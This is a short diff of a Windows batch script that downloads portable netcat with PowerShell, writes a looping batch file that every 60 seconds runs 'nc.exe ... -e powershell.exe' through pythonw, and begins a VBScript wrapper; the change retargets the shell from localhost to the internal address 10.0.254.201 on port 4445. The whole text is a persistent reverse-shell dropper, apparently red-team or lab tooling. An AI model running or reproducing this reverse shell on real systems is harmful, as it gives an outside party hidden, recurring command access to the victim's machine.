@@ -7,7 +7,7 @@ powershell "Invoke-WebRequest "https://github.com/cyberisltd/NcatPortable/blob/m
 echo @echo off > wncat.bat
 echo :loop >> wncat.bat
 echo sleep 60 >> wncat.bat
-echo pythonw -c "from subprocess import check_output; check_output('nc.exe 127.0.0.1 4445 -e powershell.exe', shell=True);" >> wncat.bat
+echo pythonw -c "from subprocess import check_output; check_output('nc.exe 10.0.254.201 4445 -e powershell.exe', shell=True);" >> wncat.bat
 echo goto loop >> wncat.bat
 
 echo Dim WinScriptHost > wncat.vbs
